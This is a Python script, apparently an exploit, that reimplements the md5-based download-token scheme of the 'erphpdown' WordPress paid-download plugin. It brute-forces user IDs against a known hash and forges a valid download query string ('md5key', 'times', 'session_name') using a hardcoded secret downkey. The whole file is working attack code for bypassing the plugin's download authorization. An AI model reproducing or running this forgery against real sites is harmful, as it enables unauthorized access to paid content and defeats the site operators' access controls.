# md5(md5($user_info->ID.'erphpdown'.$filename.$times.get_option('erphpdown_downkey')).$user_info->ID.'erphpdown'.$filename.$times.get_option('erphpdown_downkey').'mobantu');
import hashlib
import time
import base64

def generate(ID,filename,times,erphpdown_downkey):

    s=f'{ID}erphpdown{filename}{times}{erphpdown_downkey}'
    key = hashlib.md5(s.encode()).hexdigest()
    key = hashlib.md5(f'{key}{s}mobantu'.encode()).hexdigest()

    data = str(times)  # 将data转换为字符串
    encrypt = ''  # 初始化加密字符串
    for i in range(len(data)):
        encrypt += chr(ord(data[i]) ^ ord(erphpdown_downkey[i % len(erphpdown_downkey)]))  # 异或操作后转换回字符

    encrypt = base64.b64encode(encrypt.encode()).decode()
    hexcrypt = ''  # 初始化用于存储十六进制结果的变量
    for i in range(len(encrypt)):
        hex_value = hex(ord(encrypt[i]))  # 获取字符的ASCII值并转换为十六进制
        hexcrypt += hex_value[2:]  # 添加十六进制值到结果字符串，去掉前缀'0x'
    print(f'md5key={key}&times={times}&session_name={hexcrypt}')
    return key,times,hexcrypt

def brute():
    for i in range(1,99999):
        key,times,hexcrypt = generate(i,1,1719679778,'zRDIzgM')
        if key == '1345e236bea44ff0eb8a588cf18268cf':
            print(i)
            break

key,times,hexcrypt=generate(40578,1,int(time.time()),'zRDIzgM')
